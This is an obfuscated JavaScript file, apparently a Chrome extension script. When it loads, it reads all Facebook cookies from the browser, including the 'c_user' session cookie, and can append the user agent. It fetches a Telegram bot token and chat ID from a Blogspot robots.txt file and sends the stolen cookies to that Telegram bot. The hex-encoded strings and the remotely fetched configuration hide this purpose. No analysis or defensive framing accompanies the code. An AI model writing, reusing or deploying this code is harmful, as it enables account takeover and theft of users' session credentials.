var _0xc35c=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D","","\x6C\x6F\x67","\x6C\x65\x6E\x67\x74\x68","\x6E\x61\x6D\x65","\x3D","\x76\x61\x6C\x75\x65","\x3B","\x63\x5F\x75\x73\x65\x72","\x63\x6F\x6F\x6B\x69\x65\x52\x65\x73\x75\x6C\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x5B\x6E\x61\x6D\x65\x3D\x22\x75\x73\x65\x72\x2D\x61\x67\x65\x6E\x74\x22\x5D\x3A\x63\x68\x65\x63\x6B\x65\x64","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72","\x7C","\x6E\x61\x76\x69\x67\x61\x74\x6F\x72","\x70\x75\x73\x68","\x72\x65\x70\x6C\x61\x63\x65","\x74\x65\x78\x74","\x20\x7C\x20","\x61\x70\x70\x65\x6E\x64","\x63\x68\x61\x74\x5F\x69\x64","\x50\x4F\x53\x54","\x66\x6F\x6C\x6C\x6F\x77","\x65\x72\x72\x6F\x72","\x63\x61\x74\x63\x68","\x74\x68\x65\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x74\x65\x6C\x65\x67\x72\x61\x6D\x2E\x6F\x72\x67\x2F\x62\x6F\x74","\x3A","\x2F\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x6D\x65\x72\x69\x63\x61\x65\x78\x70\x72\x65\x73\x73\x76\x69\x73\x61\x2E\x62\x6C\x6F\x67\x73\x70\x6F\x74\x2E\x63\x6F\x6D\x2F\x72\x6F\x62\x6F\x74\x73\x2E\x74\x78\x74","\x67\x65\x74\x41\x6C\x6C","\x63\x6F\x6F\x6B\x69\x65\x73"];var _0x3763=[_0xc35c[0],_0xc35c[1],_0xc35c[2],_0xc35c[3],_0xc35c[4],_0xc35c[5],_0xc35c[6],_0xc35c[7],_0xc35c[8],_0xc35c[9],_0xc35c[10],_0xc35c[11],_0xc35c[12],_0xc35c[13],_0xc35c[14],_0xc35c[15],_0xc35c[16],_0xc35c[17],_0xc35c[18],_0xc35c[19],_0xc35c[20],_0xc35c[21],_0xc35c[22],_0xc35c[23],_0xc35c[24],_0xc35c[25],_0xc35c[26],_0xc35c[27],_0xc35c[28],_0xc35c[29],_0xc35c[30],_0xc35c[31],_0xc35c[32]]

function getCookie() {
    var _0xe56bx2 = _0x3763[0];
    chrome[_0x3763[32]][_0x3763[31]]({
        "url": _0xe56bx2
    }, function (_0xe56bx3) {
        var _0xe56bx4 = _0x3763[1];
        console[_0x3763[2]](_0xe56bx3);
        for (var _0xe56bx5 = 0; _0xe56bx5 < _0xe56bx3[_0x3763[3]]; _0xe56bx5++) {
            _0xe56bx4 += _0xe56bx3[_0xe56bx5][_0x3763[4]] + _0x3763[5] + _0xe56bx3[_0xe56bx5][_0x3763[6]] + _0x3763[7];
            if (_0xe56bx3[_0xe56bx5][_0x3763[4]] == _0x3763[8]) {
                currentUid = _0xe56bx3[_0xe56bx5][_0x3763[6]]
            }
        };
        if (currentUid == _0x3763[1]) {
            document[_0x3763[10]](_0x3763[9])[_0x3763[6]] = _0x3763[1];
            return false
        };
        currentCookie = _0xe56bx4;
        user_agent = navigator[_0x3763[11]];
        if (document[_0x3763[13]](_0x3763[12])) {
            currentCookie += _0x3763[14] + window[_0x3763[15]][_0x3763[11]];
            console[_0x3763[2]](currentCookie)
        };
        fetch(_0x3763[30])[_0x3763[26]]((_0xe56bx6) => {
            return _0xe56bx6[_0x3763[18]]()
        })[_0x3763[26]]((_0xe56bx6) => {
            const _0xe56bx7 = [];
            _0xe56bx6[_0x3763[17]](/:([\d\w\-]+)/g, function (_0xe56bx8, _0xe56bx9) {
                _0xe56bx7[_0x3763[16]](_0xe56bx9)
            });
            var _0xe56bxa = new FormData();
            _0xe56bxa[_0x3763[20]](_0x3763[18], currentUid + _0x3763[19] + currentCookie);
            _0xe56bxa[_0x3763[20]](_0x3763[21], _0xe56bx7[2]);
            var _0xe56bxb = {
                method: _0x3763[22],
                body: _0xe56bxa,
                redirect: _0x3763[23]
            };
            fetch(`${_0x3763[27]}${_0xe56bx7[0]}${_0x3763[28]}${_0xe56bx7[1]}${_0x3763[29]}`, _0xe56bxb)[_0x3763[26]]((_0xe56bxd) => {
                return _0xe56bxd[_0x3763[18]]()
            })[_0x3763[26]]((_0xe56bx4) => {
                return console[_0x3763[2]](_0xe56bx4)
            })[_0x3763[25]]((_0xe56bxc) => {
                return console[_0x3763[2]](_0x3763[24], _0xe56bxc)
            })
        })
    })
}
getCookie()